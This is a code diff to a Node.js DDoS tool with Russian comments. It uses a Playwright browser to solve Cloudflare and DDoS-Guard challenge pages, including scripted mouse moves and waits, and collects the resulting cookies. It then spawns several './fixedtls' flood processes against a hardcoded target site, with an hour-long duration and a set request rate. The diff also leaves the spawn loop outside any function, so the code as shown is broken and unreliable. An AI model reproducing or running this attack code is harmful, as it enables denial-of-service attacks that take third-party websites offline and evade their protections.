@@ -3,6 +3,13 @@ const colors = require('colors');
 const { spawn } = require('child_process');
 require('events').EventEmitter.defaultMaxListeners = Infinity;
 
+const args = {
+  Target: "https://legalizer.cc",
+  Time: "3600",
+  Method: "TLSv1",
+  Rate: "1000",
+  Threads: 5
+};
 const JSList = {
   js: [
     {
@@ -11,7 +18,7 @@ const JSList = {
       locate: '<h2 class="h2" id="challenge-running">'
     },
     {
-      name: "CloudFlare (Normal JS)",// незнаю на сколко хорошл sf работает
+      name: "CloudFlare (Normal JS)",// не рабоьает sf в разработке
       navigations: 2,
       locate: '<div class="cf-browser-verification cf-im-under-attack">'
     },
@@ -41,7 +48,7 @@ const ignoreCodes = [
   "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"
 ];
 
-// 🔁 Глобальные обработчики ошибок
+
 process.on("uncaughtException", handleError);
 process.on("unhandledRejection", handleError);
 process.on("warning", handleError);
@@ -53,31 +60,30 @@ function handleError(e) {
   console.warn(e);
 }
 
-// 🕓 Sleep
+// 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-// ⏱️ Логирование
+
 function log(msg) {
   const now = new Date();
   const time = now.toTimeString().split(' ')[0];
   console.log(`(${time}) - ${msg}`);
 }
 
-// Рандом
+// 
 const randomIntFromInterval = (min, max) =>
   Math.floor(Math.random() * (max - min + 1) + min);
 
-// Cookies → строка
+
 function cookiesToStr(cookies) {
   return cookies.map(({ name, value }) => `${name}=${value}`).join(";");
 }
 
-// 🔍 Детект JS защиты
 function JSDetection(html) {
   return JSList.js.find(({ locate }) => html.includes(locate));
 }
 
-// 🎯 Основная функция
+// браузер
 async function solverInstance(args) {
  log(`(${`PlayWright`.cyan}) Запуск браузера.`);
 
@@ -182,17 +188,9 @@ const ua = uaConfig.userAgent
   log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);
 
 // Запуск атаки, самописный tls можно лучше, через неделю скину нормальный.
-  for (let i = 0; i < args.Threads; i++) {
-    const cookies = cookiesToStr(await page.context().cookies());
-    spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
-  }
 
-  log(`(${`PlayWright`.green}) Сессия решена.`);
-  await browser.close();
-  return cookies;
-}
 
-// 🔧 Обработка защиты
+// Обработка защиты
 async function processProtection(page, label) {
   const html = await page.content();
   const title = await page.title();
@@ -206,13 +204,15 @@ async function processProtection(page, label) {
   if (detected) {
     log(`(${label.green}) защита: ${detected.name.yellow}`);
 
-    if (detected.name === "VShield") {
+    if (["DDoS-Guard", "DDoS-Guard-en"].includes(detected.name)) {
       for (let i = 0; i < 5; i++) {
         await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
       }
       await page.mouse.down();
       await page.mouse.move(100, 100);
       await page.mouse.up();
+      await sleep(20630)
+      await page.reload({ waitUntil: 'domcontentloaded' });
     }
 
     for (let i = 0; i < detected.navigations; i++) {
@@ -220,8 +220,18 @@ async function processProtection(page, label) {
       log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
     }
   } else {
-    log(`(${label}) JS-защита не обнаружена.`);
+    log(`(${label}) Девки нас не ждут заходим`);
   }
+}
+
+  for (let i = 0; i < args.Threads; i++) {
+    const cookies = cookiesToStr(await page.context().cookies());
+    spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
+  }
+  
+  log(`(${`PlayWright`.green}) Сессия заурыта.`);
+  await browser.close();
+  return cookies;
 }
 
 module.exports = {
